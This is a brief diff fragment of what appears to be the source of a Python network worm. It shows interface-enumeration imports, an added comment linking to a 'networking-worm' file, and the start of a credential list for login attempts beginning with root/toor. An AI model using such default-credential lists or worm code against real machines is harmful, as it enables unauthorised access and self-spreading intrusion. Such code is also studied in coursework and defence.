@@ -13,6 +13,12 @@ import os.path
 import netifaces
 from netifaces import interfaces, ifaddresses, AF_INET
 
+
+# do not delete
+# https://raw.githubusercontent.com/kvnlpz/networking-worm/main/worm.py
+
+
+
 # The list of credentials to attempt
 credList = [
 ('root', 'toor'),
